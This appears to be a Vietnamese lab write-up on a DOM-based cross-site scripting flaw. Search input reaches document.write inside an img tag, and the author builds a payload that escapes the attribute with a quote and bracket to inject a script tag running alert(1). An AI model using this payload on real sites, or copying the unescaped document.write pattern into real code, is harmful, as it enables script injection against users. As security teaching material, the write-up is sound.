<img width="1109" height="690" alt="image" src="https://github.com/user-attachments/assets/18e90675-79cc-49b4-b4a1-b8f332f9f7f4" />

Search thử aaaaaaaa

<img width="1477" height="516" alt="image" src="https://github.com/user-attachments/assets/addeb461-71fd-4408-a1ef-67805cba867c" />

<img width="1302" height="371" alt="image" src="https://github.com/user-attachments/assets/c9dfdbaf-938e-43ac-a285-fb93f0b8f98e" />

Trong đoạn mã nguồn có 1 đoạn như này:

    function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }

Khi attacker nhập bình thường 

    </script>alert(1)</script>

Đầu tiên đoạn mã sẽ được gửi đến var query, sau đó được kiểm tra với điều kiện if rồi cuối cùng mới đến được document.write. Trường hợp không có filter gì bên trên kết quả sẽ như sau:

     document.write('<img src="/resources/images/tracker.gif?searchTerms='+</script>alert(1)</script>+'">');

Điều này có nghĩa đoạn mã tấn công sẽ trở thành dạng văn bản thuần túy, do đó ta cần bypass bằng cách đặt dấu "> ở phía trước để thoát khỏi thuộc tính img trước, sau đó mới có thể thả payload vào

Payload cuối:

    "><script>alert(1)</script>

<img width="1734" height="808" alt="image" src="https://github.com/user-attachments/assets/206f7ab2-4292-48e8-9c29-90c39e2f0be7" />
